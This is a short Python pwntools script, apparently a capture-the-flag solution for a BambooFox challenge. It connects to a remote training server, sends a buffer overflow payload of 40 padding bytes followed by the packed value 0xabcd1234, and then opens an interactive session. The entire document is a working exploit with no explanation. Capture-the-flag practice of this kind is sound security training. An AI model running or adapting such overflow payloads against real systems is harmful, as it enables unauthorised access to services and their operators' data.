from pwn import *

io = remote('bamboofox.cs.nctu.edu.tw', 22001)
sleep(1)
io.send('a'*40 + p32(0xabcd1234))
io.interactive()
